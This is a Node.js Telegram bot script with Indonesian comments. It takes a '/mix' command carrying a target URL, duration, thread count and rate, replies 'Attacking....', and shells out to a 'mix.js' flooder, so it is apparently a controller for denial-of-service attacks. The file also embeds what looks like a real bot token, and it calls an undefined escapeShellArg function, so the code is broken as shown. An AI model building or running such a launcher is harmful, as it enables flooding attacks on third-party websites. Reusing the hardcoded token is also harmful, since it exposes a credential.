const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token bot Telegram Anda
const token = '7220570795:AAGrXxndOJMNNGloJS5Fkl_A8L2QDIBW-jk';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text.toLowerCase();

  console.log(`Telegram Bot Usage Activity`);
  console.log(`• User ID: ${user.id}`);
  console.log(`• Username: ${user.username || 'None'}`);
  console.log(`• Chat ID: ${chat.id}`);
  console.log(`• Command: ${command}`);
}

// Event listener for messages from users
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text.toLowerCase();

  // Log bot usage activity to console log
  logActivity(msg);

  // Respond to the /mix command
  if (command.startsWith('/mix')) {
    // Extract arguments from the message
    const args = command.split(' ');
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];

    // Check if the message format is correct
    if (args.length === 5 && url && time && thread && rate) {
      // Escape arguments to prevent command injection
      const escapedUrl = escapeShellArg([url]);
      const escapedTime = escapeShellArg([time]);
      const escapedThread = escapeShellArg([thread]);
      const escapedRate = escapeShellArg([rate]);

      bot.sendMessage(chatId, 'Attacking....');
      
      // Log the command to be executed
      const commandToExecute = `node mix.js ${escapedUrl} ${escapedTime} ${escapedThread} ${escapedRate}`;
      console.log(`Executing command: ${commandToExecute}`);

      // Execute the command
      exec(commandToExecute, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          bot.sendMessage(chatId, `stderr: ${stderr}`);
          return;
        }
        // Display stdout output if successful
        console.log(`stdout: ${stdout}`);
        bot.sendMessage(chatId, 'Process has started.');
      });
    } else {
      // Inform the user that the message format is incorrect
      bot.sendMessage(chatId, 'Incorrect message format. Use format: /mix [url] [time] [thread] [rate]');
    }
  }
});